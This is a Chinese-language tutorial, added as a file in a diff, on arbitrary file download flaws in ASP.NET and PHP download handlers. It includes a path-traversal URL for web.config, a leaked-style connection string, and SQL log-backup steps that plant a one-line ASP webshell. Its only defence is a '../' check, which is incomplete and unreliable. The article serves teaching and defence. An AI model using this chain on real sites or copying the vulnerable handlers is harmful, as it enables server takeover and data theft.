@@ -1,0 +1,100 @@
+
+# Web 文件操作脆弱性——下载文件功能
+
+> 原文：[`www.pediy.com/kssd/pediy12/142157.html`](https://www.pediy.com/kssd/pediy12/142157.html)
+
+Web 脆弱性有很多种，本人也无法穷尽，本文主要是讲一下 web 站点实现下载文件中可能存在的问题。技术性比较差，大牛请飘过…
+
+## 漏洞描述
+
+对于 web 实现下载文件功能的方法有很多种，其中有一种方法直接将文件以字节流形式，发送给客户端，而文件的路径是通过参数传入，如果此时对传入参数没有进行过滤，则可能导致下载任意文件。
+
+该功能的 `asp.net` 代码类似如下形式：
+
+```
+try
+{
+    string filename = HttpUtility.UrlDecode(Request.QueryString["filename"].ToString());
+    string filePath = Server.MapPath("upfile/" + filename);//路径
+    //以字符流的形式下载文件
+    System.IO.FileStream fs = new FileStream(filePath, FileMode.Open);
+    byte[] bytes = new byte[(int)fs.Length];
+    fs.Read(bytes, 0, bytes.Length);
+    fs.Close();
+    Response.ContentType = "application/octet-stream";
+    //通知浏览器下载文件
+    Response.AddHeader("Content-Disposition", "attachment;   filename=" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8));
+    Response.BinaryWrite(bytes);
+    Response.Flush();
+    Response.End();
+}
+catch
+{
+    Response.Write("<script>alert('资料不存在！');history.back();</script>");
+    return;
+}
+```
+
+上述代码没有对 `filename` 参数进行过滤，导致可以下载任意文件。这个脆弱性对于 `asp.Net` 站点是非常致命，因为在 `asp.net` 站点下有网站的配置文件 `web.config`，通常该文件中保存着连接数据库的用户名和密码，如果获得此信息，并且远程数据库可以远程访问，那么就可以直接登录远程数据库，通过数据库的差异备份等功能就可以获得 `webshell`。下面简单操作一下这个过程：
+
+### 攻击示例
+
+首先下载网站配置文件 `web.config`
+
+```
+http://www.example.org/DownLoadFileLow.aspx?FileName=../../web.config
+```
+
+由于下载路径通常不是网站的根目录需要使用 `../` 回溯到网站的根目录，具体是几级回溯，需要根据具体的网站而定，这个只能是尝试，本人没有想出好的方法。
+
+打开配置文件获得数据库连接字符串：
+
+```
+<add key="ConnectionStringSQL"
+ value="server=www.example.org;database=Dbicid2011;uid=Dbicid2011;pwd=ici48736;initial catalog=Dbicid2011" />
+```
+
+登录到远程数据库，使用 `log` 备份获得一句话木马：
+
+```
+use Dbicid2011--
+drop table cmd--
+alter database Dbicid2011 set recovery full--
+create table cmd (a image)--
+backup log Dbicid2011 to disk='D:\domains\icid2011\wwwroot\datafiles\RegistrationFiles\cmd.bak' with init --
+insert into cmd (a) values(0x3C256578656375746520726571756573742822636D64222920253E)--<%execute request("cmd") %>
+backup log Dbicid2011 to disk='D:\domains\icid2011\wwwroot\yxy.asp'
+```
+
+注：至于如何根据数据库获得 web 的绝对目录，就不再赘述。这样就完成了一次简单的渗透过程。
+
+## 漏洞危害
+
+此漏洞危害是不言而喻的，即使远程数据库是内网数据库或者不能远程连接，该漏洞也可以使得攻击者下载任意 `web` 源文件。大大降低攻击的难度。
+
+## 防范方法
+
+防范方法很简单，正常的 `filename` 参数中是不会包含 `../` 字符，（因为大部分情况下载文件在单独的一个目录中，不是网站的根目录，要想下载任意文件必须使用 `../` 回溯）只要检查参数中是否包含 `../`，如果包含基本上就可以肯定是非法请求，直接提示，拒绝下载即可。
+
+上述只是以 `asp.net` 为例，其实对于其它脚本也是一样，如 `php` 脚本实现该功能代码如下：
+
+```
+<?php
+// downloading a file
+$filename = $_GET['filename'];
+header("Pragma: public");
+header("Expires: 0"); // set expiration time
+header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); 
+header("Content-Type: application/force-download");
+header("Content-Type: application/octet-stream");
+header("Content-Type: application/download");
+header("Content-Disposition: attachment; filename=".($filename).";");
+header("Content-Transfer-Encoding: binary");
+header("Content-Length: ".filesize($filename));
+readfile("$filename"); 
+echo basename($filename);
+exit();
+?>
+```
+
+基本功能类似，同样存在该问题，但是 `php` 的数据库连接文件不是固定的，需要下载几个文件才能找到，并且一般站点的 `mysql` 不允许远程连接，与上面的渗透方式有些不同，但是也可以下载源码或者系统其它配置信息，危害也已经很大了。具体的渗透过程和防范方法与上面类似，在此不再赘述。
